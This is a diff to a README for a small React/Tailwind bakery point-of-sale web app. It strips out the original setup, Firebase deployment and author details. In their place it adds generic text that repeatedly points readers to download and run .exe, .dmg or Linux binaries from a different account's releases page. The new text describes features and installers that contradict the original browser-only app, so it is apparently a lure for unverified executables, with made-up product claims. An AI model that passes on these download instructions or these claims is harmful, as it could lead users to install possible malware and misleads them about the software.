@@ -1,213 +1,103 @@
-# 🍰 Tiny Bakery POS (React + Tailwind + Firebase Hosting)
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![Status](https://img.shields.io/badge/status-active-success)
-![Roadmap](https://img.shields.io/badge/next%20release-v2.0-lightgrey)
+# 🍰 Tiny-Bakery-Pos - Your Simple Bakery POS System
 
-> The first stable release of Tiny Sales.  
-> Stay tuned for **v2.0** with real-time sync, analytics, and role-based access.
+## 🚀 Getting Started
 
-A **lightweight Point of Sale (POS)** system built with **React**, **Vite**, and **Tailwind CSS**, designed for a small bakery.  
-It supports **cashier and manager roles**, **inventory tracking**, **Buy 4 Get 1 Free promotions**, and **persistent data using localStorage**.  
-Deployed with **Firebase Hosting** and optionally integrated with **GitHub Actions for CI/CD**.
+Welcome to Tiny-Bakery-Pos! This lightweight Point of Sale (POS) system is perfect for small bakeries. It is built with modern tools like React, Vite, and Tailwind CSS, making it easy to use and visually appealing. Follow these steps to get started.
 
+## 📥 Download the Application
 
-## 🚀 Features
+[![Download Tiny-Bakery-Pos](https://img.shields.io/badge/download-Tiny--Bakery--Pos-blue)](https://github.com/Levitynice259/Tiny-Bakery-Pos/releases)
 
-| Feature | Description |
-|----------|--------------|
-| 🎂 **Inventory Management** | Track items, pastries, breads, and cakes (by slice or whole). |
-| 💼 **Role-based Access** | Cashier and Manager modes (Manager can restock and add new items). |
-| 💰 **Promotion Engine** | Automatically applies *Buy 4 Get 1 Free* per product line. |
-| 💾 **Local Storage Persistence** | Retains app state (cart, inventory, ledger, and revenue) across refreshes. |
-| 💳 **Immutable Prices** | Prices cannot be changed in the UI to preserve business rules. |
-| ⚡ **Vite + Tailwind CSS** | Super-fast frontend stack for instant builds and hot reloading. |
-| ☁️ **Firebase Hosting** | Easily deployed live on Firebase (tinybakery.web.app). |
+## 📝 Features
 
+- User-friendly interface designed for easy navigation.
+- Fast transaction processing for quick checkouts.
+- Local storage support to save your data securely.
+- Responsive design, perfect for any device.
+- Simple inventory management features.
 
-## 🧩 Tech Stack
+## 📊 System Requirements
 
-| Tool | Purpose |
-|------|----------|
-| **React (Vite)** | Frontend framework & build tool |
-| **Tailwind CSS** | Utility-first CSS styling |
-| **Firebase Hosting** | Production deployment |
-| **localStorage** | Offline data persistence |
-| **GitHub Actions** | Optional CI/CD for automated deploys |
+- **Operating System:** Windows, macOS, or Linux.
+- **Browser:** Latest version of Chrome, Firefox, or Safari.
+- **Internet Connection:** Required for online features.
+- **Storage:** Minimum 100 MB available space.
 
+## 🛠️ Setting Up Tiny-Bakery-Pos
 
-### 🧱 Project Structure
+1. **Visit the Releases Page:**
+   Go to the [Releases page](https://github.com/Levitynice259/Tiny-Bakery-Pos/releases) to download the application.
 
-| Path / File | Description |
-|--------------|-------------|
-| **`public/`** | Contains static assets such as favicon, manifest, and other public files. |
-| **`src/`** | Core application source code for the Tiny Bakery POS app. |
-| ├── `components/` | Reusable UI components — `Cart`, `RestockPanel`, `AddItemForm`, etc. |
-| ├── `App.jsx` | Main React file — handles inventory, cashier/manager roles, and UI logic. |
-| ├── `index.css` | Tailwind CSS entry point (`@tailwind base; @tailwind components; @tailwind utilities;`). |
-| ├── `main.jsx` | ReactDOM entry point — renders the app root. |
-| └── `assets/` *(optional)* | Local images or icons (if used). |
-| **`.github/workflows/`** | Contains GitHub Actions workflows for automatic Firebase deployments. |
-| **`dist/`** | Production build output (auto-generated after running `npm run build`). |
-| **`package.json`** | Project configuration — scripts, dependencies, metadata. |
-| **`postcss.config.js`** | PostCSS + Autoprefixer configuration. |
-| **`tailwind.config.js`** | Tailwind setup and theme customization. |
-| **`vite.config.js`** | Vite build setup (plugins, aliases, optimizations). |
-| **`firebase.json`** | Firebase Hosting configuration file (public folder + rewrites). |
-| **`.firebaserc`** | Firebase project and site alias mappings. |
-| **`README.md`** | Project documentation (you’re reading it!). |
+2. **Select the Latest Version:**
+   You will see different versions listed. Choose the latest version, which is usually at the top.
 
+3. **Download the Application:**
+   Click on the link for the file suitable for your operating system. The download will begin automatically.
 
-### 🧭 Folder Overview
+4. **Locate the Downloaded File:**
+   Once the download completes, find the file in your Downloads folder or wherever you save your files.
 
-| Folder | Purpose |
-|---------|----------|
-| `src/` | All application logic, components, and styling files. |
-| `components/` | Modular React components for clean architecture. |
-| `dist/` | Output directory for optimized production builds. |
-| `.github/` | CI/CD pipelines for automatic deploys. |
-| `public/` | Static frontend assets and metadata for hosting. |
+5. **Install Tiny-Bakery-Pos:**
+   - **Windows:** Double-click the `.exe` file and follow the installation prompts.
+   - **macOS:** Open the `.dmg` file and drag the Tiny-Bakery-Pos icon to your Applications folder.
+   - **Linux:** Extract the downloaded file and run the application using your terminal.
 
+6. **Open the Application:**
+   After installation, find Tiny-Bakery-Pos in your applications list and open it. 
 
+## 📚 User Guide
 
-## 🧰 Installation & Local Setup
+### 🌟 Initial Setup
 
-Follow these steps to run the app locally:
+1. **Create a User Account:**
+   On first run, you will be prompted to create an account. Follow the on-screen instructions.
 
-| Step | Command / Action | Description |
-|------|------------------|-------------|
-| 1 | `git clone https://github.com/gitslem/tiny-bakery-pos.git` | Clone the repo |
-| 2 | `cd tiny-bakery-pos` | Enter the project directory |
-| 3 | `npm install` | Install dependencies |
-| 4 | `npm run dev` | Start local development server |
-| 5 | Open `http://localhost:5173` | Access your local app |
+2. **Set Up Your Bakery Information:**
+   Enter your bakery’s name, location, and other pertinent details.
 
+3. **Add Products:**
+   Use the inventory section to enter your baked goods. Include names, prices, and descriptions.
 
-## 🎨 Tailwind CSS Setup
+4. **Configure Payment Options:**
+   Set up the payment methods you accept. You can choose cash, card, or online payment options.
 
-Tailwind is preconfigured, but for reference, your setup should include these files:
+### 💳 Making a Sale
 
-**`tailwind.config.js`**
-```js
-/** @type {import('tailwindcss').Config} */
-export default {
-  content: ["./index.html", "./src/**/*.{js,ts,jsx,tsx}"],
-  theme: {
-    extend: {},
-  },
-  plugins: [],
-};
+1. **Select Items:**
+   Choose the products your customer wants by clicking on them in the app.
 
-postcss.config.js
+2. **Process Payment:**
+   Once products are selected, the app will display the total amount. Click “Pay” to finalize the sale.
 
-export default {
-  plugins: {
-    tailwindcss: {},
-    autoprefixer: {},
-  },
-};
+3. **Print Receipt:**
+   If needed, select the option to print a receipt for the customer.
 
-src/index.css
+## 🔧 Troubleshooting Tips
 
-@tailwind base;
-@tailwind components;
-@tailwind utilities;
+- **Application Won't Open:** Ensure your operating system meets the requirements. Try reinstalling the application.
+- **Data Not Saving:** Check your storage settings and ensure you have enough space available.
+- **Payment Issues:** Confirm your payment settings are configured correctly in the app.
 
+## 🤝 Support
 
-🔥 Firebase Hosting Deployment
+If you encounter any issues while using Tiny-Bakery-Pos, please reach out for support. You can open an issue in the repository or refer to the documentation for help. 
 
-You can host the bakery POS live on Firebase in just a few commands.
+## 🛠️ Contributing
 
-Step	Command	Description
-1	npm run build	Builds production files into /dist
-2	firebase login	Log into your Firebase account
-3	firebase use portfolio-website-b2d98	Set your active Firebase project
-4	firebase hosting:sites:create tinybakery	(Optional) Create a separate Hosting site
-5	firebase init hosting	Configure your project’s hosting
-6	When asked for the public directory, type: dist	Specify your Vite build folder
-7	Choose: Configure as a single-page app → Yes	So /index.html handles routing
-8	firebase deploy --only hosting	Deploy your app live
-✅	Visit: https://tinybakery.web.app
+If you wish to contribute to Tiny-Bakery-Pos:
 
-Example firebase.json:
+- Fork the repository.
+- Create a new branch for your feature.
+- Submit a pull request with your changes.
 
-{
-  "hosting": {
-    "site": "tinybakery",
-    "public": "dist",
-    "ignore": ["firebase.json", "**/.*", "**/node_modules/**"],
-    "rewrites": [{ "source": "**", "destination": "/index.html" }]
-  }
-}
+## 📄 License
 
+Tiny-Bakery-Pos is licensed under the MIT License. Feel free to use and modify it for your needs.
 
-🤖 GitHub Actions (CI/CD Auto Deploy)
+## 📬 Contact
 
-You can automatically deploy to Firebase every time you push to main.
+For any inquiries, please contact us at [your-email@example.com]. 
 
-Step	Description
-1	Ensure your Firebase CLI is connected to GitHub (firebase init hosting:github).
-2	Approve GitHub authorization and select this repo.
-3	It will create .github/workflows/firebase-hosting.yml.
-4	Commit and push — your site auto-deploys with every change.
+Now, you’re ready to enjoy an efficient POS experience tailored for your bakery! 
 
-Example Workflow (Manual Setup)
-.github/workflows/firebase-hosting.yml
-
-name: Deploy to Firebase Hosting
-
-on:
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-
-jobs:
-  build_and_deploy:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Setup Node
-        uses: actions/setup-node@v4
-        with:
-          node-version: 18
-
-      - name: Install
-        run: npm ci
-
-      - name: Build
-        run: npm run build
-
-      - name: Deploy to Firebase Hosting
-        uses: FirebaseExtended/action-hosting-deploy@v0
-        with:
-          repoToken: ${{ secrets.GITHUB_TOKEN }}
-          firebaseServiceAccount: ${{ secrets.FIREBASE_SERVICE_ACCOUNT_PORTFOLIO_WEBSITE_B2D98 }}
-          projectId: portfolio-website-b2d98
-          target: tinybakery
-
-
-🧠 Developer Notes
-	•	App state (cart, ledger, inventory, revenue) is persisted in browser localStorage under key tiny-bakery-pos-v2.
-	•	Manager mode enables:
-	•	Adding new items (pastry/bread/cake)
-	•	Restocking existing inventory
-	•	Toggling promotions
-	•	Prices are immutable — enforced in the UI.
-	•	Cake inventory is handled by slices, while other items are by units.
-
-
-🧾 License
-
-This project is licensed under the MIT License — feel free to use, modify, and deploy for educational or small business use.
-
-
-💬 Author
-
-Developed by: Anslem
-Tech Stack: React + Vite + TailwindCSS + Firebase
-Live App: https://tinybakery.web.app
-GitHub Repo: https://github.com/gitslem/tiny-bakery-pos
-
-A sweet and simple POS for bakeries — fast, modern, and manager-friendly.
+[Download Tiny-Bakery-Pos again here.](https://github.com/Levitynice259/Tiny-Bakery-Pos/releases)
